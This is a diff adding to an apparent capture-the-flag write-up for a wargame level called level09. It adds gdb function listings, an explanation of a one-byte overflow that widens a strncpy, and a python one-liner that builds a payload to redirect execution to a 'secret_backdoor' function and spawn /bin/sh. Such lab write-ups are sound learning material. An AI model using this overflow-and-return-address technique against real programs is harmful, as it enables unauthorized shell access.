@@ -25,6 +25,18 @@ Non-debugging symbols:
 0x0000000000000aa8  main
 ...
 
+(gdb) info function
+All defined functions:
+
+Non-debugging symbols:
+...
+0x000055555555488c  secret_backdoor
+0x00005555555548c0  handle_msg
+0x0000555555554932  set_msg
+0x00005555555549cd  set_username
+0x0000555555554aa8  main
+...
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x0000000000000aa8 <+0>:	push   %rbp
@@ -172,6 +184,19 @@ Dump of assembler code for function secret_backdoor:
    0x00000000000008be <+50>:	leaveq
    0x00000000000008bf <+51>:	retq
 End of assembler dump.
+
+*****************************************************************************
+A first fgets in set_username permits us to write 41 characters in 
+user.username[180] beginning at *username+140 so we will have a one byte overflow
+in user.n so we can change it's lower bits and strncpy more charachters from
+our second input, in set_msg, in user.username[180], because usern.n is the third
+argument of our strncpy. So we can overflow. The offset needed to rewrite the
+instuction pointer is sub $0xc0,%rsp + 1 register pushed on the stack, 
+0xc0 + 8 = 0xc8 = 200. We need the address of the function secret_backdoor
+so we can jump on it. This function will permits us to open a new shell, 
+because it contains a call to system and we give it an argument via a fgets
+on stdin. It's address is 0x000055555555488c.
+*****************************************************************************
 
 level09@OverRide:~$ python -c "print('A' * 40 + '\xd4' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh')" > /tmp/exploit
 
